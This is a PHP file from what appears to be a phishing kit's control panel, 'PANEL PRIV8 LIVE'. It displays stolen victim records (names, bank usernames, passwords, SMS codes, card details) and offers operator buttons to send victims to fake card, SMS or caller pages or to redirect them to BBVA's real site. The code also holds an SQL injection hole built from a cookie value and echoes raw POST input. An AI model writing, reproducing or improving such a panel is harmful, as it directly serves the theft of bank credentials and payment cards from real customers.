<?php
/**
* PANEL PRIV8 LIVE
* @package    PANEL PRIV8 LIVE
* @author     https://t.me/neo_net
* @copyright  2020
* @version    2.0
* Info :  php de tabla de notificaciones
*/
session_start();
include '../database/db.php';
include '../defense/ajax.php';
/* Si esta vacia la variable no mostramos nada */
$hash = @$_COOKIE['identificator'];
$fhrji = $connection->query("SELECT hash FROM secure where hash='$hash'");
if (!isset($_SESSION['userSession']) && mysqli_num_rows($fhrji) === 0) {
//Nothing to do boy
}
else {
$query = $connection->query("SELECT * FROM tbl_users WHERE user_id=".$_SESSION['userSession']);
$userRow=$query->fetch_array();
$notification = $connection->query("SELECT * FROM numeros order by id asc limit 500");
 
echo '
<div class="card-panel blue-grey lighten-1 no-shadow hide">
<span class="white-text hide labeled">'.$_POST['default'].'</span>
        </div>
  <table class="striped neonet responsive-table">
        <thead>
          <tr>
              <th>Status</th>
              <th>Nombre</th>
              <th>User</th>
              <th>Pass</th>
              <th>SMS</th>
             <th>CC</th>
             <th>Acciones Internas</th>
             <th>Acciones Finales</th>
          </tr>
        </thead>
        <tbody>';
if(mysqli_num_rows($notification) === 0):
?>
<tr>
<td colspan="13">No hay Registros en la base de datos</td>
</tr>
</tbody>
</table>
<?php
endif;
while($row = mysqli_fetch_array($notification)):
if ($row['stella'] == '') {$row['stella']='NO';}
if ($row['stella'] == 1) {$row['stella']='SI';}
if ($row['status'] == '') {$row['status']='En Espera';}
if ($row['status'] == 1) {$row['status']='En Página de CC';}
if ($row['status'] == 2) {$row['status']='En Página de SMS';}
if ($row['status'] == 3) {$row['status']='En Página Caller';}
if ($row['status'] == 4) {$row['status']='Redireccionado BBVA';}
?>
<tr>
<td><?php echo htmlentities($row['status']); ?></td>
<td><?php echo htmlentities($row['nombre']); ?></td>
<td><?php echo htmlentities($row['user']); ?></td>
<td><?php echo htmlentities($row['pass']); ?></td>
<td><?php if ($row['firma'] == '') {$row['firma']='N/A'; echo $row['firma'];} else { echo htmlentities($row['firma']); } ?></td>
<td><?php echo htmlentities($row['stella']); ?></td>
<td><button class="waves-effect waves-light btn red lighten-1 delete tooltipped" data-id="<?php echo $row['id']; ?>" name="action" name="action" data-position="bottom" data-tooltip="Borrar Registro">Borrar</button>
  <button class="waves-effect waves-light btn cyan accent-2 logo-completo tooltipped" data-id="<?php echo $row['id']; ?>" name="action" data-position="bottom" data-tooltip="Ver logo completo">  <i class="large material-icons">description</i></button>
  <button class="waves-effect waves-light btn teal accent-3  finalizar5 tooltipped" data-id="<?php echo $row['id']; ?>" name="action" data-position="bottom" data-tooltip="Enviar Página de CC">  <i class="large material-icons">credit_card</i></button>
  <button class="waves-effect waves-light btn green accent-3 finalizar2 tooltipped" data-id="<?php echo $row['id']; ?>" name="action" data-position="bottom" data-tooltip="Enviar Página SMS">  <i class="large material-icons">sms</i></button>
</td>
<td>

  <button class="waves-effect waves-light btn red accent-3 finalizar tooltipped" data-id="<?php echo $row['id']; ?>" name="action" data-position="bottom" data-tooltip="Enviar Página Caller">  <i class="large material-icons">phone</i></button>
  <button class="waves-effect waves-light btn teal accent-3 criptocal tooltipped" data-id="<?php echo $row['id']; ?>" name="action" data-position="bottom" data-tooltip="Redireccionar a Página BBVA">  <i class="large material-icons">check_box</i></button>



</td>
</tr>
 <?php
 endwhile;
 echo '</tbody></table>';}
 ?>